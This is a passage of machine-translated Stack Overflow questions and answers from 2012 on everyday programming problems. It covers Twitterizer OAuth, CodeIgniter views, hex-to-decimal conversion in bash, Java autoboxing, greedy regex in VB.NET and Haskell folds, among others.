SomeBase 应该像这样继承该接口：

```
class SomeBase<T> : ISomeRow<T> where T : RowBase
{
    //some other properties and abstract methods
} 
```

然后，以下将起作用：

```
List<ISomeRow<RowBase>> myList = new List<ISomeRow<RowBase>>();
myList.Add(new SomeClass1());
myList.Add(new SomeClass2()); 
```

希望这就是你要找的:)

# c# - 如何使用 twitterizer2 获取用户时间线

> ID：13280110
> 
> 赞同：0
> 
> 时间：2012-11-07T23:30:17.330
> 
> 标签：c#, asp.net, twitter, twitterizer

我正在使用 twitterizer2 尝试获取用户最近的几条推文，然后使用 oAuth 而不是用户的屏幕名称将它们写入表中，但我是 twitterizer 的新手，所以我不知道该怎么做。

```
 var step = Request.QueryString["p"].ToString();
        var key = ConfigurationManager.AppSettings["twitterKey"];
        var secret = ConfigurationManager.AppSettings["twitterSecret"];

        if (step == "1")
        {
            var reqquest = OAuthUtility.GetRequestToken(key, secret, "http://localhost:2480/Site/Default2.aspx?p=2").Token;
            Response.Redirect(OAuthUtility.BuildAuthorizationUri(reqquest, true).AbsoluteUri);
        }

        else if (step == "2")
        {
            var token = Request.QueryString["oauth_token"];
            var verifier = Request.QueryString["oauth_verifier"];

            OAuthTokenResponse getTokens = OAuthUtility.GetAccessToken(key, secret, token, verifier);

            var oAuth_token = new OAuthTokens();
            oAuth_token.AccessToken = getTokens.Token;
            oAuth_token.ConsumerKey = key;
            oAuth_token.ConsumerSecret = secret;
            oAuth_token.AccessTokenSecret = getTokens.TokenSecret;

            TwitterResponse<TwitterStatusCollection> tweets = TwitterTimeline.UserTimeline(oAuth_token);

            foreach (var tweet in tweets.ResponseObject)
            {
                Response.Write(tweet.Text);
            }

            //TwitterStatus.Update(oAuth_token, "hello");
        } 
```

我怎样才能做到这一点 ？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T14:27:26.857

您应该首先获取用户的 oAuth 令牌。

首先，您需要用户的访问令牌。你可以检索这些

```
var requestToken = OAuthUtility.GetRequestToken("consumerKey", "consumerSecret", "your return url").Token;
Response.Redirect(OAuthUtility.BuildAuthorizationUri(requestToken, true).AbsoluteUri); 
```

这应该要求您登录 Twitter。然后您将返回到您设置的返回 url，在 QueryString 中有 oauth_token 和 oauth_verifier。这些是访问令牌。

现在您可以使用这些令牌来检索该用户的推文，方法是

```
 TwitterResponse<TwitterStatusCollection> tweets = TwitterTimeline.UserTimeline(authorization_tokens); 
```

通过做这样的事情来遍历这些

```
 foreach (var tweet in tweets.ResponseObject)
 {
      string tweetText = tweet.Text;
 } 
```

# php - 将数据从数据库发送到视图

> ID：13280111
> 
> 赞同：0
> 
> 时间：2012-11-07T23:30:18.773
> 
> 标签：php, codeigniter, codeigniter-2

我正在尝试在数据库中查找“用户”当前订阅并在视图中显示它的名称。主要是 ID，所以我使用会话中的用户 ID 在“订阅”中找到适当的行。这可以正常工作（无论如何我相信）。我的问题是将选定的数据发送到视图。视图中显示的唯一文本是“数组”。

我究竟做错了什么？

这是我的代码：

```
 // displays current subscription in view
    $userid = $this -> session -> userdata('user_id');

    $this -> db -> select('subscription');
    $this -> db -> where ('id', $userid);
    $query = $this -> db -> get('subscriptions');

    $data['packagename'] = $query -> result_array(); 
```

以下是我的观点：

```
 <? echo $packagename; ?> 
```

**编辑：**我查看了 CI 手册中的 FOREACH 函数。我插上它，感觉更近了一点。我不想要任何过于复杂的代码，就像你们中的一些人发布的那样，因为我只是在学习。所以现在当页面被渲染时，会显示以下文本：`string(9) "mrpopular"`

```
 // displays current subscription in view
    $userid = $this -> session -> userdata('user_id');

    $this -> db -> select('subscription');
    $this -> db -> where ('id', $userid);
    $query = $this -> db -> get('subscriptions');

    foreach ($query->result() as $row)
    {
        $data['packagename'] = $row->subscription;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T23:32:19.497

那是因为您将数组值设置为`$data['package_name']`. `result_array()`返回一个数组。

您可能需要将您的值表示为`$packagename['some_key']`，`some_key`您感兴趣的字段在哪里。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T23:41:40.160

您从数据库中获得的是一个数组，您将其设置为 $data['packagename']

要快速检查您是否拥有正确的数据，只需使用：

```
<? print_r($data['packagename']); ?> 
```

这应该在页面上写入所有数据

但最好的方法是使用循环：

```
<?
foreach ($data['packagename'] as &$value) 
{
    echo $value;
}
?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T23:41:35.987

试试这个

```
foreach($yourarray as $key=>$val)
{
    echo "Key:" . $key. " Value: " . $val. "<br>";
} 
```

您将从数组中获取所有键和值

用您的数组名称更改 $yourarray

# c++ - boost::statechart 和非常量事件

> ID：13280112
> 
> 赞同：1
> 
> 时间：2012-11-07T23:30:25.083
> 
> 标签：c++, boost, boost-statechart

有没有办法定义`boost::statechart::in_state_reactions`允许将非常量事件传递给反应函数？

# python - ValueError：使用序列设置数组元素。scipy 最小化

> ID：13280114
> 
> 赞同：1
> 
> 时间：2012-11-07T23:30:33.480
> 
> 标签：python, numpy, scipy

```
""" ___ """
from scipy.optimize import minimize
import numpy as np

LENGTH = 100

def process(x):
    return x * 2 + 5

def draw(process, length):
    """ """
    y = np.random.normal(0, 10, length)
    data = [process(y_) for y_ in y]
    rnd = np.random.normal(3, 1, len(data))
    return y, rnd + data

def maximum_likelyhood(y, X):
    objective = lambda b: np.transpose(X) * (y - X * b)
    x0 = np.zeros(100)
    res =  minimize(objective, x0=x0)
    return res.x

y, X = draw(process, LENGTH)
print maximum_likelyhood(y, X) 
```

产生一个

```
ValueError: setting an array element with a sequence. 
```

有几个类似的问题，都指出x0不是一维数组，而这里是一维数组。（或者不是？如果请解释为什么以及如何使其成为 1D）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-08T00:10:24.860

发生错误是因为目标函数是向量函数（接受向量，返回向量），但根据[scipy.optimize.minimize 文档](http://docs.scipy.org/doc/scipy/reference/generated/scipy.optimize.minimize.html)，它只接受标量函数（接受向量返回标量。）

# javascript - 使用 JavaScript 更改锚文本

> ID：13280116
> 
> 赞同：7
> 
> 时间：2012-11-07T23:30:39.767
> 
> 标签：javascript, html

示例 HTML：

```
<div id="video-quality" style="">
<a class="low bttn" href="">
<span>Low Quality</span>
</a>
</div> 
```

嘿，我正在尝试使用 JavaScript 来定位锚标记并将其当前的“低质量”文本更改为“高质量”。

我不太了解 JavaScript，但这是我想出的。但这显然不起作用：

```
var vid_id=document.getElementById('video-quality');
var anchor=vid_id.getElementsByTagName('a');
anchor.innerHTML="High Quality"; 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-07T23:32:55.380

假设`video-quality` `div`will 中只有**一个**锚，那么您离我们不远了：

```
var vid_id=document.getElementById('video-quality');
var anchor=vid_id.getElementsByTagName('a');
anchor[0].innerHTML="High Quality";
//    ^^^-- change here 
```

*（如果您不需要支持 IE7 及更早版本，可以使用更短的方法，请参阅[David 的回答](https://stackoverflow.com/a/13280239/157247)了解更多信息。）*

关键在于名称`getElementsByTagName`（注意复数）。它返回一个[`NodeList`](http://www.w3.org/TR/DOM-Level-2-Core/core.html#ID-536297177)，而不是一个元素。A`NodeList`是（令人震惊！）匹配节点的列表，在本例中为匹配*元素*。`innerHTML`是单个元素的属性，因此我们必须对 进行索引`NodeList`才能访问特定元素。上面的代码假定至少有一个匹配元素，并更新了它的 HTML。如果你想更具防御性：

```
var vid_id=document.getElementById('video-quality');
var anchors=vid_id.getElementsByTagName('a');
if (anchors[0]) {
    anchors[0].innerHTML="High Quality";
} 
```

这允许没有匹配的锚点的可能性。

请注意，通过这样做，您将删除`span`元素，因为`span`是锚点的后代。如果您想避免这种情况，只需查找`span`作为锚点后代的元素，就像您在`div`.

* * *

FWIW，我建议使用合理的以 JavaScript 浏览器为中心的库，如[jQuery](http://jquery.com)、[YUI](http://developer.yahoo.com/yui/)、[Closure](http://code.google.com/closure/library)或[其他任何一个](http://en.wikipedia.org/wiki/List_of_JavaScript_libraries)。它们提供了*许多*实用功能，并消除了一些浏览器差异。但是，如果您更喜欢直接使用 DOM，那也没关系。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-07T23:44:06.940

如果您不需要旧版支持（IE7-），您可以编写：

```
document.querySelector('#video-quality a span').innerHTML = 'High Quality'; 
```

如果您确实需要旧版支持，我推荐使用 jQuery 或类似的库，以使从单一、广泛使用的 API 中选择 DOM 节点变得更加简单。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-07T23:39:51.100

纯javascript：

```
var vid_id = document.getElementById('video-quality');
var span = vid_id.getElementsByTagName('span');
span[0].innerText='High Quality' 
```

或者你可以只使用 jQuery：

```
$('#video-quality span').text('High Quality'); 
```

希望这可以帮助。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-09-04T16:30:59.473

简单是最好的。只需给 span 元素一个 id，然后直接更改它。

```
<div id="video-quality" style="">
<a class="low bttn" href="">
<span id="quality-setting">Low Quality</span>
</a>
</div> 
```

那么脚本是：

```
document.getElementById('quality-setting').innerHTML="High Quality"; 
```

# browser - 强制浏览器显示 ISO-8859-1 而不解释为 Windows-1252

> ID：13280125
> 
> 赞同：4
> 
> 时间：2012-11-07T23:31:09.177
> 
> 标签：browser, character-encoding, iso-8859-1, windows-1252

从历史上看，许多宣传自己采用[ISO-8859-1](http://en.wikipedia.org/wiki/ISO-8859-1) ( *Latin-1* ) 编码的网页实际上包含[Windows-1252](http://en.wikipedia.org/wiki/Windows-1252)编码（这是 Latin-1 的严格超集）的内容。

浏览器更新了他们的行为以将所有 Latin-1 文本视为 Windows-1252，这已经是一个足够大的问题了。这种行为随后被合理化为[HTML5 [draft] 标准](http://www.whatwg.org/specs/web-apps/current-work/multipage/parsing.html#character-encodings-0)。

我正在写一组页面，我想在上面显示两种编码之间的区别，但这似乎是不可能的，因为我的 Latin-1 页面实际上从未被视为 Latin-1。在任何浏览器中，有什么方法可以真正强制尊重页面编码并显示演示？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T06:55:47.177

恐怕没有直接的办法。我认为 Opera 曾经有一个选项，它的当前版本有一个选项（通过 opera:config）来强制特定的编码，覆盖 HTTP 标头等等，但即使在那里，iso-8859-1 实际上意味着 windows-1252。我也检查了 Opera 版本 5 和 9，没有运气。

但是使用当前版本的 Opera（12.02），您可以通过 View → Encoding 设置编码，并在“Western”设置中（其中 iso-8859-1 表示 windows-1252 照常），选择 iso-8859-15 会导致在显示中有效忽略的字节范围 130–159（十进制），根据 windows-1252 不显示。因此，这或多或少意味着将数据视为真正的 iso-8859-1——当然，除了 iso-8859-1 和 iso-8859-15 不同的少数图形字符，使用后者。

从技术上讲，这些字节代表 iso-8859-1 中的 C1 控件，在上述模式中，Opera 实际上是这样对待它们的。它们在 HTML 中是不允许的，但通常只是被浏览器忽略。

# .htaccess - 使用 RewriteRule 模拟 DirectoryIndext

> ID：13280129
> 
> 赞同：-2
> 
> 时间：2012-11-07T23:31:29.420
> 
> 标签：.htaccess, mod-rewrite, apache

我需要制作一个可以重写的 RewriteRule：

```
site.com or site.com/ 
```

至：

```
site.com/file.xx 
```

真的不知道如何编写它并使其正常工作。请问有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T03:16:36.677

请查看[文档](http://httpd.apache.org/docs/current/rewrite/intro.html)并准备好回答诸如“您尝试过什么？”之类的问题。在 Stack Overflow 上发布问题之前。我想你会发现这个答案要么解决了你的问题，要么至少给了你一个很好的起点。

```
RewriteRule ^/?$ /file.ext [R=301,L] 
```

# bash - Shell脚本中的十六进制转十进制

> ID：13280131
> 
> 赞同：151
> 
> 时间：2012-11-07T23:31:43.400
> 
> 标签：bash, shell, hex, decimal

有人可以帮我在 shell 脚本中将十六进制数转换为十进制数吗？

例如，我想`bfca3000`使用 shell 脚本将十六进制数转换为十进制数。我基本上想要两个十六进制数字的差异。

我的代码是：

```
var3=`echo "ibase=16; $var1" | bc`
var4=`echo "ibase=16; $var2" | bc`
var5=$(($var4-$var3))               # [Line 48] 
```

执行时，我收到此错误：

```
Line 48: -: syntax error: operand expected (error token is "-") 
```

* * *

## 回答 #1

> 赞同：372
> 
> 时间：2012-11-07T23:36:18.013

要将十六进制转换为十进制，有很多方法可以在 shell 中或使用外部程序进行：

用[bash](/questions/tagged/bash "显示标记为“bash”的问题")：

```
$ echo $((16#FF))
255 
```

与[bc](/questions/tagged/bc "显示标记为“bc”的问题")：

```
$ echo "ibase=16; FF" | bc
255 
```

与[perl](/questions/tagged/perl "显示标记为“perl”的问题")：

```
$ perl -le 'print hex("FF");'
255 
```

与[printf](/questions/tagged/printf "显示标记为“printf”的问题")：

```
$ printf "%d\n" 0xFF
255 
```

与[蟒蛇](/questions/tagged/python "显示标记为“python”的问题")：

```
$ python -c 'print(int("FF", 16))'
255 
```

与[红宝石](/questions/tagged/ruby "显示标记为“红宝石”的问题")：

```
$ ruby -e 'p "FF".to_i(16)'
255 
```

使用[node.js](/questions/tagged/node.js "显示标记为“node.js”的问题")：

```
$ nodejs <<< "console.log(parseInt('FF', 16))"
255 
```

与[犀牛](/questions/tagged/rhino "显示标记为“犀牛”的问题")：

```
$ rhino<<EOF
print(parseInt('FF', 16))
EOF
...
255 
```

与[groovy](/questions/tagged/groovy "显示标记为“groovy”的问题")：

```
$ groovy -e 'println Integer.parseInt("FF",16)'
255 
```

* * *

## 回答 #2

> 赞同：48
> 
> 时间：2014-04-04T12:48:47.103

在 Linux 上处理一个非常轻量级的嵌入式busybox 版本意味着许多传统命令不可用（bc、printf、dc、perl、python）

```
echo $((0x2f))
47

hexNum=2f
echo $((0x${hexNum}))
47 
```

感谢[Peter Leung](http://linuxcommando.blogspot.com/2008/04/quick-hex-decimal-conversion-using-cli.html)提供的解决方案。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2013-05-14T07:26:49.117

使用 shell 的另一种方法（bash 或 ksh，不适用于 dash）：

```
echo $((16#FF))
255 
```

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2012-11-08T00:21:01.643

您可以在 shell 中使用各种工具。根据您最初的问题，Sputnick 为您提供了一个很好的选项概述。他在给你多个正确答案所花费的时间绝对值得投票。

还有一个不在他的名单上：

```
[ghoti@pc ~]$ dc -e '16i BFCA3000 p'
3217698816 
```

但是，如果您只想做减法，为什么还要将输入更改为以 10 为底呢？

```
[ghoti@pc ~]$ dc -e '16i BFCA3000 17FF - p 10o p'
3217692673
BFCA1801
[ghoti@pc ~]$ 
```

命令是“`dc`桌面计算”。它还将从标准输入中获取输入，例如`bc`，但不是使用“操作顺序”，而是使用堆叠（“反向波兰语”）表示法。你给它添加到堆栈中的输入，然后给它从堆栈中弹出项目的操作符，然后推回结果。

在上面的命令中，我们有以下内容：

*   **`16i`**-- 告诉 dc 接受以 16 为底的输入（十六进制）。不改变输出基数。
*   **`BFCA3000`**-- 你的初始号码
*   **`17FF`**-- 我选择从您的初始数字中减去的随机十六进制数字
*   **`-`**-- 取我们压入的两个数，从前一个数中减去后一个数，然后将结果压回堆栈
*   **`p`**-- 打印栈中的最后一项。这不会改变堆栈，所以......
*   **`10o`**-- 告诉 dc 以“10”为基数打印其输出，但请记住，我们的输入编号方案目前是十六进制的，因此“10”表示“16”。
*   **`p`**-- 再次打印堆栈中的最后一项……这次是十六进制。

您可以使用 dc 构建极其复杂的数学解决方案。在您的工具箱中拥有 shell 脚本是一件好事。

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2015-11-12T21:36:35.113

在破折号和其他外壳中，您可以使用

```
printf "%d\n" (your hexadecimal number) 
```

将十六进制数转换为十进制。这不是特定于 bash 或 ksh。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2015-08-29T22:34:54.247

当变量为空（或空）时，会出现报告的错误：

```
$ unset var3 var4; var5=$(($var4-$var3))
bash: -: syntax error: operand expected (error token is "-") 
```

这可能是因为给 bc 的值不正确。那很可能是 bc 需要大写值。它需要`BFCA3000`，不是`bfca3000`。这在 bash 中很容易修复，只需使用`^^`扩展：

```
var3=bfca3000; var3=`echo "ibase=16; ${var1^^}" | bc` 
```

这会将脚本更改为：

```
#!/bin/bash

var1="bfca3000"
var2="efca3250"

var3="$(echo "ibase=16; ${var1^^}" | bc)"
var4="$(echo "ibase=16; ${var2^^}" | bc)"

var5="$(($var4-$var3))"

echo "Diference $var5" 
```

但是不需要使用 bc [1]，因为 bash 可以直接执行翻译和减法：

```
#!/bin/bash

var1="bfca3000"
var2="efca3250"

var5="$(( 16#$var2 - 16#$var1 ))"

echo "Diference $var5" 
```

[1]^(注意：我假设这些值可以用 64 位数学表示，因为差异是在原始脚本中以 bash 计算的。如果以 64 位编译，则 Bash 仅限于小于 ((2**63)-1) 的整数。这将是与没有此类限制的 bc 的唯一区别。)

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2020-10-27T17:37:08.960

最短的方式：

```
$ echo $[0x3F]
63 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2020-11-16T16:27:05.623

我的 $PATH 上有这个方便的脚本来过滤`0x1337`-like; `1337`; 或`"0x1337"`十进制字符串的输入行（为清楚起见进行了扩展）：

```
#!/usr/bin/env bash

while read data; do
  withoutQuotes=`echo ${data} | sed s/\"//g`
  without0x=`echo ${withoutQuotes} | sed s/0x//g`
  clean=${without0x}
  echo $((16#${clean}))
done 
```

# java - Java中按钮功能的动作命令

> ID：13280132
> 
> 赞同：1
> 
> 时间：2012-11-07T23:32:05.337
> 
> 标签：java, swing

这是我第一次使用 java swing n co 进行 gui 编程，所以我需要一些建议。我目前正在通过在按钮上设置操作命令来为按钮添加功能。然后我在容器上监听如下操作：

```
 colorButton.setText("Select Color");
    colorButton.setFocusable(false);
    colorButton.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
    colorButton.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
    jToolBar1.add(colorButton);
    jToolBar1.add(jSeparator1);
    colorButton.setActionCommand("selectColor");
    colorButton.addActionListener(this); 
```

然后，我使用如下代码段检查对哪个组件执行了执行操作：

```
else if("selectColor".equals(e.getActionCommand())) {
        Color c = JColorChooser.showDialog(this, "Select Color", Color.GREEN);
        if (selectedShape != null) {
            undoStack.add(copyOf(model.getAllShapes()));
            model.setShapeColor(selectedShape, c);  
        }
        else{
            defaultColor = c;
        }
    } 
```

我只是想知道这是好还是坏的做法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T23:42:20.170

我通常会做的是使用匿名类，例如

```
JButton button = new JButton("BUTTON");  

button.addActionListener(new ActionListener() {  
  public void actionPerformed(ActionEvent event ) {  
    // do relevant stuff
  }  
}); 
```

编辑：MadProgrammer 的评论（上图）很好地总结了您的选择。这可能确实不是“更长”方法的最佳方法，但对于简单的方法来说，恕我直言。

# java - 为什么后增量对包装类起作用

> ID：13280134
> 
> 赞同：12
> 
> 时间：2012-11-07T23:32:17.330
> 
> 标签：java, immutability, post-increment

我正在审查一些代码，并遇到了一个实例，有人对 Integer 的包装类成员变量进行了后期递增。我自己尝试过，真的很惊讶它的工作原理。

```
Integer x = 0; 
System.out.print(x++ + ", ");
System.out.print(x); 
```

这打印出来`0, 1`，不像`0, 0` 我预期的那样。我浏览了语言规范，找不到任何内容。任何人都可以向我解释为什么这样做有效，以及跨多个平台是否安全？我原以为这会分解成

```
Integer x = 0;
int temp1 = x.intValue();
int temp2 = temp1 + 1;
System.out.println(temp1);
temp1 = temp2;
System.out.println(x.intValue()); 
```

但显然规范中有一些东西使它`x = temp1;`在最后一行之前添加

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-07T23:34:55.380

跨平台使用非常安全。该行为[在 Java 语言规范的第 15.4.2 节中](http://docs.oracle.com/javase/specs/jls/se7/html/jls-15.html#jls-15.14.2)指定（强调添加）：

> 后缀表达式的结果必须是可转换（[第 5.1.8 节](http://docs.oracle.com/javase/specs/jls/se7/html/jls-5.html#jls-5.1.8)）为数字类型的类型的变量，否则会发生编译时错误。
> 
> 后缀增量表达式的类型是变量的类型。后缀增量表达式的结果不是一个变量，而是一个值。
> 
> 在运行时，如果操作数表达式的求值突然完成，则后缀增量表达式出于同样的原因突然完成并且不会发生增量。否则，将值 1 添加到变量的值，**并将总和存储回变量**。在加法之前，对值 1 和变量的值执行二进制数字提升 ( [§5.6.2 )。](http://docs.oracle.com/javase/specs/jls/se7/html/jls-5.html#jls-5.6.2)如有必要，总和通过缩小原始转换（[§5.1.3](http://docs.oracle.com/javase/specs/jls/se7/html/jls-5.html#jls-5.1.3)）和/或在存储之前对变量的类型进行装箱转换（ [§5.1.7 ）进行缩小。](http://docs.oracle.com/javase/specs/jls/se7/html/jls-5.html#jls-5.1.7)后缀增量表达式的值是存储新值之前变量的值。

**编辑**这是您的示例代码中发生的更准确的等价物：

```
Integer x = 0;
int temp = x.intValue();
x = temp + 1; // autoboxing!
System.out.println(temp + ", ");
System.out.println(x.intValue()); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T23:34:47.080

从 Java 1.5 开始，Java 执行自动拆箱以在必要时将“包装器类型”转换为`Integer`相应的原始类型`int`。然后增量运算符可以处理结果`int`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-05-16T19:57:10.690

对于只编程几年或几年的程序员来说，Tedd Hopp 爵士的回答处于非常复杂的水平。

让我以简单的方式消除您的疑问

```
 Integer x=10;
    x++;
    System.out.println(x) ; 
```

输出将是 11

因为 ++ 后增量或前增量仅在内部进行 1 加法

即 x+1 是它必须执行的并将结果放回同一个变量中。

```
ie x=x+1; 
```

现在我们都知道 + 运算符只能接受原语，而 x 是对象，那么我们就有了自动拆箱和自动装箱的概念。所以表达式变成

```
x.intValue()+1;//step 1 auto-unboxing

x=Integer.valueOf(x.intValue()+1);//step 2 auto-boxing 
```

因此，在 println 语句中的另一个自动拆箱步骤之后，输出为 11。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-07T23:36:18.310

它是 Java 5 中称为[自动装箱](http://docs.oracle.com/javase/1.5.0/docs/guide/language/autoboxing.html)的“新”功能——整数在需要时转换为 in——反之亦然。同样适用于 Float、Double、Boolean 等。

虽然这是一个方便的功能，但如果您不小心，它可能会导致巨大的性能损失

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-11-25T08:57:50.377

请注意，如果将增量操作移至方法，则输出将与预期的一样：

```
public void printIncrement(Integer x1) {
    System.out.print(x1++ + ", ");
} 
```

这是因为 Java 传递了引用的副本，所以您现在正在使用一个新的引用对象，x1 而不是 x。x 指向的原始 Integer 对象保持不变，x 仍然指向它。

如果您忘记了它，那么在使用方法进行计算时，这很容易咬到您。

# c - 使用 fget 和解析

> ID：13280135
> 
> 赞同：0
> 
> 时间：2012-11-07T23:32:18.113
> 
> 标签：c, parsing, io, stack

所以我想读取一个文件，我应该有4个功能：它是主要功能

```
/* Queue functions */

/* Basic type for the queue data structure */
typedef struct queue {
  node *front;          /* Front of the line */
  node *rear;   

    /* Back of the line */
} queue; 
```

* * *

对不起，我编译错了，现在可以了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T23:52:55.527

因为`str2card`和`card2str`原型和实际功能不同。它们必须相同。可能与其他也一样。

你在这里有原型：

```
// Utility functions
node_data str2card(char *buf);
char *card2str(node_data c, char *buf); 
```

以及后来的功能：

```
/* Convert a string like 14D into a card */
card str2card(char *buf){
...
}
...
/* Given a card c, put a string like 14D in buf representing it.  Good
for printing  */
char *card2str(card c, char *buf){
...
} 
```

# jquery - 如何使用 jquery 从 ajax 函数调用中获取返回数组？

> ID：13280144
> 
> 赞同：0
> 
> 时间：2012-11-07T23:33:20.107
> 
> 标签：jquery

```
var testFile = $("#selection").val(),
    testData = getTestData(testFile); 

// not working during the first time I run the function, empty
alert(testData); 

function getTestData(testF) {
    $.getJSON("test.php", {
        fileTest: testF
    }, function (data) {
        $.each(data, function (index, value) {
            if (value != "") {} else {
                testArray[index] = value;
            }
        });
    });

    // working I see the values
    alert(testArray); 

    // not working the first time running this function
    return testArray; 
}​ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T23:36:28.013

***AJAX 是异步***的..所以你的函数必须在值被存储到它之前已经返回..

最好将其存储在更高范围的变量中，并在请求完成后使用它..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T23:38:19.970

您将需要处理返回的数组，并在`getJSON()`.

你得到空值的原因是你的返回 testArray，很可能在`getJSON`调用和回调函数完成执行之前执行。

这是因为该方法是异步执行的。您将需要对回调函数中的数据执行任何操作。

# vb.net - 将用户控件添加到表单

> ID：13280150
> 
> 赞同：0
> 
> 时间：2012-11-07T23:34:08.093
> 
> 标签：vb.net

您好，我的项目中有一个用户控件，我想在单击按钮时将此用户控件添加到表单中。

这是我写的代码：

```
Using GstAbonnement As New GestionAbonnement() With {.Dock = DockStyle.Fill}
            Panel1.Controls.Add(GstAbonnement)
End Using 
```

问题是当我点击按钮时没有任何反应

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T07:58:34.863

尝试这个

```
Dim GstAbonnement As New GestionAbonnement()
GstAbonnement.Dock = DockStyle.Fill
Panel1.Controls.Add(GstAbonnement) 
```

完成控件后，将其处理掉

```
GstAbonnement.Dispose() 
```

# regex - 让所有正则表达式匹配出现在列表框中，VB.NET

> ID：13280155
> 
> 赞同：3
> 
> 时间：2012-11-07T23:34:42.243
> 
> 标签：regex, vb.net, listbox, listboxitems

我有一个字符串，例如下面的示例，我正在尝试使用 VB.NET 来获取字符串中的所有 HotelNames。

这是我的代码：

```
 Dim thepage As String = postreqreader.ReadToEnd

    Dim r As New Regex("""HotelName"":"".*""")
    Dim matches As MatchCollection = r.Matches(thepage)
    For Each hotelname As Match In matches
        ListBox1.Items.Add(hotelname.Value.Split("""").GetValue(3))
    Next 
```

但是，这只会将第一个 HotelName 添加到我的 ListBox。有什么想法可以让每个 HotelName 匹配到我的列表框中吗？谢谢你的时间！

*缩短字符串：*

> "HotelName":"达拉斯阿灵顿希尔顿惠庭套房酒店","HotelNameShort":"希尔顿惠庭套房酒店...","HotelNameShortAvailabilityRecommendations":"H...","HotelName":"阿灵顿骑士酒店","HotelNameShort":"Knights Inn Arlington","HotelNameShortAvailabilityRecommendations":"Knights Inn Arlingto...","HotelName":"Howard Johnson Express Inn - Arlington Ballpark / Six Flags","HotelNameShort":"Howard Johnson Express在...","HotelNameShortAvailabilityRecommendations":"Howard Johnson Express...","HotelName":"阿灵顿/西南速 8","HotelNameShort":"阿灵顿/西南速 8","HotelNameShortAvailabilityRecommendations":"速 8 阿灵顿/西南...",

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T23:54:08.817

你`.*`很贪心。这意味着它会尽可能多地消耗，因此您的第一个匹配项将占用**整个**字符串，直到最后一个`"`. 然后，您将单个匹配项（实际上包含所有酒店名称）拆分为`"`并取出第三个元素。（看看`hotelname.Value.Split("""").Count`，它会很大）

诀窍是使重复不贪婪，甚至更好的是，不允许重复消耗`"`：

```
"""HotelName"":""([^""]*)"" 
```

现在在`"`and`"`我们只是重复非引号字符，所以我们永远不能超过第一个结束引号。仅此一项就可以解决您的问题，但我还添加了这些括号。它们不会匹配任何实际的括号，而是创建一个捕获组，这使得酒店名称的检索更加容易：

```
For Each hotelname As Match In matches
    ListBox1.Items.Add(hotelname.Groups[1]) 
```

对于每组括号，其中匹配的内容将放入 的一个元素中`match.Groups`，从左到右计算左括号。正则表达式匹配已经完成了获取各个值所需的一切，所以为什么要执行第二个拆分步骤。

# haskell - Haskell - foldl 和 foldr？

> ID：13280159
> 
> 赞同：66
> 
> 时间：2012-11-07T23:34:56.543
> 
> 标签：haskell, fold

`foldl`和`foldr`只是循环的方向之间的区别？我认为他们所做的事情有所不同，而不仅仅是方向？

* * *

## 回答 #1

> 赞同：129
> 
> 时间：2012-11-07T23:37:50.923

如果您的函数不是关联的（即，括号表达式的方式很重要），例如，
`foldr (-) 0 [1..10] = -5`但是`foldl (-) 0 [1..10] = -55`.
这是因为前者等于`1-(2-(3-(4-(5-(6-(7-(8-(9-(10 - 0)))))))))`，而后者等于`(((((((((0-1)-2)-3)-4)-5)-6)-7)-8)-9)-10`。

而因为`(+)`是关联的（添加子表达式的顺序无关紧要），
`foldr (+) 0 [1..10] = 55`并且`foldl (+) 0 [1..10] = 55`. `(++)`是另一个关联操作，因为`xs ++ (ys ++ zs)`给出了相同的答案`(xs ++ ys) ++ zs`（尽管第一个更快 - 不要使用`foldl (++)`）。

有些功能只能以一种方式工作：
`foldr (:) :: [a] -> [a] -> [a]`但这`foldl (:)`是无稽之谈。

看看 Cale Gibbard 的图表（来自[维基百科文章](http://en.wikipedia.org/wiki/Fold_(higher-order_function))）；你可以看到`f`被真正不同的数据对调用：
![文件夹](../Images/b8299101a1dcc7730116b91dc21a4103.png)![折叠](../Images/870065affc72661e2b4fed4ff86e8bc6.png)

另一个区别是，因为它匹配列表的结构，`foldr`对于惰性求值通常更有效，因此可以与无限列表一起使用，只要`f`它的第二个参数是非严格的（如`(:)`or `(++)`）。`foldl`很少是更好的选择。如果您正在使用`foldl`它通常值得使用`foldl'`，因为它很严格并且阻止您建立一长串中间结果。（有关此主题的更多信息，请参阅[此问题](https://stackoverflow.com/questions/3429634/foldl-is-tail-recursive-so-how-come-foldr-runs-faster-than-foldl)的答案。）

# jenkins - 如何在 Jenkins-Blitz 构建步骤中包含查询字符串参数？

> ID：13280161
> 
> 赞同：1
> 
> 时间：2012-11-07T23:34:58.360
> 
> 标签：jenkins, jenkins-plugins, blitz++

我正在使用 Jenkins 的 Blitz 插件对我们的 API 进行负载测试。

我在参数化查询字符串的域部分时遇到问题。

